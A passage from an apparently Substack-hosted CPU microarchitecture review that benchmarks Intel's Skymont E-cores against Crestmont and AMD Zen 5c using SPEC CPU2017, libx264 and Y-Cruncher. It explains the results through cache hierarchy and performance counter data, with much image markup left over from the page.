data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:386,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/hc2024_skymont_perf_slide/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Against low power Crestmont, Skymont benefits from better caching and better clocks courtesy of TSMC’s leading edge N3B process. Unsurprisingly, Skymont posts a huge 78.3% performance advantage in SPEC CPU2017’s integer suite. Skymont’s lead grows to a staggering 83.8% in the floating point suite.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_spec/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png" width="688" height="458" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:458,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_spec/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8d0158c2-435d-4184-8077-7fd04b58377f_713x475.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>But in my opinion, comparisons against low power Crestmont only provide half the picture. Skymont is meant to boost multithreaded performance too, like Crestmont Cores on. Meteor Lake uses Crestmont cores on the Intel 4 Compute Tile to fill that role. Therefore, a comparison against those Compute Tile Crestmont cores is also appropriate.</p><p>That comparison is less favorable to Skymont, which only manages a 0.68% performance gain in SPEC CPU2017’s integer tests. I consider that within margin of error, and even if it weren’t, no one would notice that in practice. Gains in the floating point suite are better at 15.7%, but I’d like to see double digit gains in both suites for such a large architecture change. I suspect Skymont would indeed provide double digit percentage gains given identical cache setups. However, giving Crestmont a 24 MB L3 and a 100 MHz clock speed advantage seems to be enough to cancel out Skymont’s improved architecture.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_specint/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png" width="688" height="732" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/dc829d15-4334-43a2-8564-f61c3551460e_754x802.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:732,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_specint/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc829d15-4334-43a2-8564-f61c3551460e_754x802.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>AMD’s Zen 5c is another appropriate comparison, as the Strix Point mobile chip features eight of those to improve multithreaded performance. Low clock speed on AMD’s density optimized core lets Skymont lead by a hair in SPEC CPU2017, though I still consider a 1.5% gain within margin of error. The floating point suite sees AMD’s Zen 5c pull ahead by a margin of 20.4%, partially because Zen 5c destroys Intel’s E-Cores on 503.bwaves and 549.fotonik3d.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_specfp/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png" width="688" height="789" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/bc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:789,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_specfp/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc489827-b0ba-4b2b-9877-590525d6b6e0_752x862.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>While Skymont turns in a decent showing against its predecessor in SPEC CPU2017’s floating point suite, I feel SPEC’s reliance on compiler code generation doesn’t paint a complete picture. Software projects often use </span><a href="https://gitlab.com/AOMediaCodec/SVT-AV1/-/tree/master/Source/Lib/ASM_AVX2?ref_type=heads" rel="">intrinsics </a><span>or </span><a href="https://code.videolan.org/videolan/x264/-/tree/master/common/x86" rel="">assembly </a><span>if they require high performance. libx264 is one of them. Software video encoding offers better quality than hardware encoders by being more computationally expensive, and even the older H.264 codec is no exception.</span></p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32663" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png" width="481" height="288" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:288,&quot;width&quot;:481,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32663&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c740770-27e9-48ce-852d-10131bb7c8d2_481x288.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In this workload, the Core Ultra 7 258V’s quad core Skymont cluster loses to a quad core Crestmont cluster on the Core Ultra 7 155H. Crestmont wins by just over 5%, though performance counters reported a 8.1% IPC advantage for Crestmont (1.46 IPC vs 1.35 IPC on Skymont). Skymont’s branch predictor does shine through, delivering 97.52% accuracy compared to Crestmont’s 97.35%. But it’s not enough to push Skymont ahead.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32692" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png" width="481" height="288" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:288,&quot;width&quot;:481,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32692&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b79d32f-12b6-48f0-8d98-684a5cc357b7_481x288.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Using event 0x2E and unit masks 0x4F/0x41 for LLC references and misses</figcaption></figure></div><p>Skymont’s cache setup is a clear culprit. While Intel hasn’t documented performance counters for Skymont or Lion Cove yet, they do have a set of “architectural” performance events introduced with the Core Duo and Core Solo generation. Those are guaranteed to work on subsequent Intel CPUs, and include events for longest latency cache references and misses. What those events map to can vary of course. From testing, Skymont considers the 4 MB L2 the “longest latency cache”. And those events show Skymont sees far more misses with its 4 MB L2 than Crestmont does with its 24 MB L3.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32667" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png" width="481" height="288" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/73377467-065d-44d9-b9a6-69e622074960_481x288.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:288,&quot;width&quot;:481,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32667&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F73377467-065d-44d9-b9a6-69e622074960_481x288.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Tested using the Broadwell binary</figcaption></figure></div><p>Y-Cruncher is a very heavily vectorized program that calculates Pi digits. Skymont really shows its advantage in this workload, posting a 1.56x speedup over its predecessor. Skymont also averaged 1.81 instructions per active core cycle, again a huge improvement over Cresmtont’s 1.22 IPC.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32707" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png" width="688" height="593" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:593,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32707&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F129f4cb6-cdf7-436a-a223-2d1cacded84e_710x612.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>IPC, from performance counters. High IPC tasks tend to benefit more from a wider core, while lower IPC ones benefit from mitigating whatever the biggest bottleneck is (often backend memory access latency or frontend latency)</figcaption></figure></div><p><span>Performance-wise, Skymont seems to be at its best in high IPC workloads with a small cache footprint. For example Skymont beats Crestmont by 20.8% in 548.exchange2, a workload that </span><a href="https://chipsandcheese.com/2024/09/19/running-spec-cpu2017-at-chips-and-cheese/" rel="">fits in Zen 4’s 32 KB L1D cache</a><span>. There, Crestmont’s already high 3.39 IPC increases to 4.21 with Skymont’s improvements. Conversely 520.omnetpp sees 10.38 MPKI on Zen 4’s 1 MB L2, and 1.42 MPKI for its 32 MB L3. On that test, Skymont drops to 0.54 IPC, while Crestmont holds up better at 0.62 IPC. However if a workload is really cache unfriendly, Skymont’s ability to pull more memory bandwidth can show through. I suspect that’s what happens in Y-Cruncher and 549.fotonik3d, as both are very memory bandwidth bound on other architectures. There, Skymont posts huge gains.</span></p><p>Skymont is a huge step over Crestmont. Nearly every part of the core is beefed up in some way, and often significantly so. After seeing both P-Cores and E-Cores barely change from Alder Lake to Meteor Lake, I’m happy to see massive progress on both of Intel’s core lines. Assessing Lion Cove was straightforward because the core delivered a typical gen-on-gen improvement despite its changed cache hierarchy. Skymont’s situation is more complicated.</p><p>Certainly Lunar Lake’s Skymont cores crush low power Crestmont. But standard Crestmont already posts huge gains over its low power variant, thanks to a better cache setup and better process node. Despite massive architecture improvements, Skymont’s performance is hit or miss compared to Crestmont. Lunar Lake’s different cache hierarchy plays a large role in this, and highlights the difficulties in having one core setup play both the low power and multithreaded performance roles. It also highlights the massive role caches play in CPU performance. Even a dramatically improved core can struggle to deliver gains if the cache subsystem doesn’t keep up. That’s especially important with LPDDR5X, which has high latency and can be a handicap in low core count workloads.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32701" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 848w, 